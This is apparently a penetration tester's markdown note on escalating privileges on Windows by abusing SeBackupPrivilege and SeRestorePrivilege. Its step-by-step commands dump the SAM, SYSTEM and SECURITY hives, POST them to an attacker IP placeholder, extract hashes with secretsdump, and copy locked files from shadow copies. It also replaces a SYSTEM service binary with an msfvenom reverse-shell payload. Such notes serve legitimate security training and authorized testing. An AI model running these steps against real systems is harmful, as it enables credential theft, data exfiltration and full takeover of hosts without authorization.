---
created: 2026-09-02
updated: 2026-09-18
tags:
  - Windows
  - Windows_PrivEsc
status: complete
---
> [!abstract]+ **Scope**: `SeBackupPrivilege` and `SeRestorePrivilege`; dumping registry hives; extracting files through shadow copies; copying locked files; replacing service files.

- [ ] Confirm your current user has `SeBackupPrivilege` and `SeRestorePrivilege` assigned (either directly or inherited from a group membership) and determine whether they're enabled.
- [ ] If the privileges are present but disabled, enable them in the process that will perform the privileged operation (e.g., using [`EnableAllTokenPrivs.ps1`](https://github.com/fashionproof/EnableAllTokenPrivs/blob/master/EnableAllTokenPrivs.ps1) in PowerShell).
- [ ] Choose an exploitation path: dump registry hives, extract files through shadow copies, copy locked files, or replace a service file.
- [ ] Verify privilege escalation.

## `SeBackupPrivilege` and `SeRestorePrivilege`

>**`SeBackupPrivilege`** is a Windows user right that allows a process to bypass normal discretionary access checks when opening files and directories for **read access**.

- Even when the target file is protected by a restrictive DACL, an enabled `SeBackupPrivilege` allows the caller to obtain read access — but only when the file is opened using backup semantics, `FILE_FLAG_BACKUP_SEMANTICS`. 

>[!note] `SeBackupPrivilege` and `SeRestorePrivielge` can't directly access files exclusively locked by other processes, such as `NTDS.dit` locked by `NTDS`. 

- Specifically, `SeBackupPrivilege` grants `READ_CONTROL`, `ACCESS_SYSTEM_SECURITY`, `FILE_GENERIC_READ`, and `FILE_TRAVERSE`.

>[!important] By default, `SeBackupPrivilege` is assigned to the built-in [[Backup Operators]] and `Administrators` groups.

>**`SeRestorePrivilege`** is a Windows user right that allows a process to bypass normal discretionary access checks when opening files, directories, and registry keys for **write access**.

- Similar to `SeBackupPrivilege`, `SeRestorePrivilege` requires `FILE_FLAG_BACKUP_SEMANTICS` to take effect; however, it provides write access to files rather read.
- `SeRestorePrivilege` grants `WRITE_DAC`, `WRITE_OWNER`, `ACCESS_SYSTEM_SECURITY`, `FILE_GENERIC_WRITE`, `FILE_ADD_FILE`, `FILE_ADD_SUBDIRECTORY`, and `DELETE`.

>[!note] See [`Privilege Constraints (Authorization) — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants).

> [!note] See [[Windows privileges#SeBackupPrivilege]] and [[Windows privileges#SeRestorePrivilege]].

- `SeBackupPrivilege` and `SeRestorePrivilege` privilege escalation vectors:
	- **Dumping registry hives**
		- Opening protected `SAM`, `SYSTEM`, and `SECURITY` hives for read access and saving offline copies to then extract credentials.
	- **Extracting protected files from volume shadow copies**
		- Creating a Volume Shadow Copy (VSS) snapshot of the target drive and extracting sensitive data from the snapshot rather than live filesystem.
	- **Copying protected files**
		- Using backup semantics to access files protected by DACL and copying them to a location where they can be analyzed.
	- **Replacing service executables**
		- Using restore semantics to overwrite protected service executables or DLLs to potentially execute code under the service's security context (such as `SYSTEM`).

>[!note] Dumping registry hives, reading files from VSS snapshots, and copying protected files are rather **indirect privilege escalation techniques**. They provide access to protected files from which you may be able to recover sensitive information, such as credentials, and subsequently use it to escalate privileges. Replacing a service executable can provide a **direct path to code execution** under the service's security context.

## Enumerating and enabling privileges

- Check if `SeBackupPrivilege` and `SeRestorePrivilege` are present in your access token:

```powershell
whoami /priv
```

- Even if the privileges are present in the output but marked `Disabled`, Windows won't consider them during access checks. You need to enable the privileges first before using them.
- In your current PowerShell session, you can use [`EnableAllTokenPrivs.ps1`](https://github.com/fashionproof/EnableAllTokenPrivs/blob/master/EnableAllTokenPrivs.ps1):

```powershell
Import-Module .\EnableAllTokenPrivs.ps1
```
```powershell
.\EnableAllTokenPrivs.ps1
```
```powershell
whoami /priv
```

>[!note] The script calls `AdjustTokenPrivileges()` against your current process token; it can't assign new privileges, only toggle already assigned privileges to an enabled state.
## Dumping `SAM`, `SYSTEM`, and `SECURITY` hives

- The `SAM`, `SYSTEM`, and `SECURITY` registry hives are locked by the operating system at runtime and protected by restrictive DACLs.
- `SeBackupPrivilege` allows you to save protected registry hives using a tool that respects backup semantics, such as [`reg save`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg-save).

- Save all three hives to a writable directory:

```powershell
reg save HKLM\SAM C:\Windows\Temp\SAM
```

```powershell
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
```

```powershell
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY
```

| Hive            | Contents                                                               |
| --------------- | ---------------------------------------------------------------------- |
| `HKLM\SAM`      | Local account NTLM password hashes.                                    |
| `HKLM\SYSTEM`   | Boot key required to decrypt the SAM database.                         |
| `HKLM\SECURITY` | LSA secrets, cached domain credentials, and service account passwords. |

- Transfer the copies to your system for offline analysis:

```bash
python -m http.server 8000
```

```powershell
Invoke-WebRequest -Uri "http://<attacker_ip_address>:8000/" -Method POST -InFile C:\Windows\Temp\SAM
```
```powershell
Invoke-WebRequest -Uri "http://<attacker_ip_address>:8000/" -Method POST -InFile C:\Windows\Temp\SYSTEM
```
```powershell
Invoke-WebRequest -Uri "http://<attacker_ip_address>:8000/" -Method POST -InFile C:\Windows\Temp\SECURITY
```

- Parse the offline hives with Impacket `secretsdump`:

```bash
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```

| Flag        | Argument   | Description                                                                                 |
| ----------- | ---------- | ------------------------------------------------------------------------------------------- |
| `-sam`      | `SAM`      | Path to the offline `SAM` hive file.                                                        |
| `-system`   | `SYSTEM`   | Path to the offline `SYSTEM` hive containing the boot key.                                  |
| `-security` | `SECURITY` | Path to the offline `SECURITY` hive for LSA secrets and cached credentials.                 |
| `LOCAL`     | -          | Instructs `secretsdump` to process offline files rather than connecting to a remote target. |

>[!note] See [[🛠️ Dumping SAM, SYSTEM & SECURITY hives]].
## Extracting protected files from volume shadow copies

- [`diskshadow.exe`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) is a Windows Server utility for creating and managing **Volume Shadow Copy Service (VSS) shadow copies**. A shadow copy provides a point-in-time view of a volume.

>[!note] A **volume** refers to a logical storage unit that Windows can mount and use; it generally contains a single file system.

- Creating a shadow copy with `diskshadow` requires local administrative privileges (membership in the `Adminstrators` group or equivalent).
- For existing shadow copies, **`SeBackupPrivilege`** can provide read access to any files regardless of their DACL.
- Since a shadow copy is just a point-in-time snapshot of a volume, it can be used to **access files that would otherwise be locked on a live filesystem, such as `NTDS.dit`**.

---

1. Write a `diskshadow` script to create a shadow copy and expose it as a drive letter:

```powershell
Set-Content -Path C:\Windows\Temp\shadow.dsh -Value @"
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume c: alias shadow_copy
create
expose %shadow_copy% z:
end backup
"@
```

2. Execute the script:

```powershell
diskshadow.exe /s C:\Windows\Temp\shadow.dsh
```

3. Check that the shadow copy was created:

```powershell
diskshadow.exe /c "list shadows all"
```

4. Copy the target files from the shadow copy to a location where you can analyze them:

```powershell
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Windows\Temp\SAM.hive
```
```powershell
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Temp\SYSTEM.hive
```
```powershell
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\Windows\Temp\SECURITY.hive
```

5. Remove the shadow copy when done:

```powershell
diskshadow.exe /c "delete shadows all"
```

## Copying protected files using .`robocopy`

- [`robocopy`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy) backup mode (`/b`) opens the source files using backup semantics ( `FILE_FLAG_BACKUP_SEMANTICS`). In this case, Windows honors `SeBackupPrivilege` during access control checks, which effectively lets you copy any file (not otherwise locked by a running process) regardless of its DACL.
- This works directly on the live `C:\` volume for files that are protected by DACL but not locked by another process:

```powershell
robocopy /b C:\Windows\System32\config C:\Windows\Temp SAM SYSTEM SECURITY
```

>[!warning] The `NTDS.dit` file on a live domain controller is exclusively locked by the `NTDS` service. You can't copy it with `robocopy /b` alone; create a shadow copy first and copy from the exposed volume ([[#Extracting protected files from volume shadow copies]]).
## Replacing service files

- `SeRestorePrivilege` allows you to open any file on disk for write access regardless of its DACL. If you replace a service executable or loaded DLL that runs as `SYSTEM` and restart the service, your code runs as `SYSTEM`.
### Replacing service executables

1. Identify services running as `SYSTEM` and inspect their executable paths:

```powershell
Get-CimInstance win32_service | Where-Object {$_.StartName -eq "LocalSystem"} | Select-Object Name, DisplayName, PathName, StartMode
```

2. Check the service state:

```powershell
sc.exe query <ServiceName>
```

- If the service is running, stop it (if you have sufficient permissions):

```powershell
sc.exe stop <ServiceName>
```

>[!note] You can't directly replace a service executable while the service is running because the executable may be held open by the service process.

3. Back up the original service executable:

```powershell
Copy-Item "C:\Program Files\TargetApp\service.exe" "C:\Program Files\TargetApp\service.exe.bak"
```

```powershell
copy C:\Program Files\TargetApp\service.exe C:\Program Files\TargetApp\service.exe.bak
```

4. Replace the original executable with your custom one using `robocopy /b`:

```powershell
robocopy /b C:\Windows\Temp "C:\Program Files\TargetApp" shell.exe /is /it
```

5. Rename `shell.exe` to the service executable's original filename before restarting the service:

```powershell
Rename-Item "C:\Program Files\TargetApp\shell.exe" "service.exe"
```

| Flag  | Description                                                                                                                                         |
| ----- | --------------------------------------------------------------------------------------------------------------------------------------------------- |
| `/b`  | Copy files in backup mode, overriding DACLs that would otherwise prevent access. `SeBackupPrivilege` and `SeRestorePrivilege` are used as required. |
| `/is` | Copy the file even if the destination file is identical to the source.                                                                              |
| `/it` | Copy the file even if the destination file has the same timestamp as the source.                                                                    |

>[!tip]+
>- Generate an executable using `msfvenom`:
> ```bash
> msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip_address> LPORT=4444 -f exe -o shell.exe
> ```

5. Restart the service:

```powershell
sc.exe start <ServiceName>
```

- If the service runs as `LocalSystem`, the service process executes under the `SYSTEM` security context, and so does the replacement executable.

>[!tip]+
> - Once you're done, restore the original executable:
> 
> ```powershell
> sc.exe stop <ServiceName>
> ```
> ```powershell
> Copy-Item `
>     "C:\Program Files\TargetApp\service.exe.bak" `
>     "C:\Program Files\TargetApp\service.exe" `
>     -Force
> ```
> ```powershell
> sc.exe start <ServiceName>
> ```
## References and further reading

- [`Back up files and directories — Microsoft Learn`](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/back-up-files-and-directories)
- [`Restore files and directories — Microsoft Learn`](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/restore-files-and-directories)
- [`Backup Operators to Domain Admin — ired.team`](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [`Diskshadow — LOLBAS`](https://lolbas-project.github.io/lolbas/Binaries/Diskshadow/)
- [`robocopy command reference — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [`impacket-secretsdump — Impacket`](https://github.com/fortra/impacket/blob/master/impacket/examples/secretsdump.py)
- [`Privilege Constraints (Authorization) — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)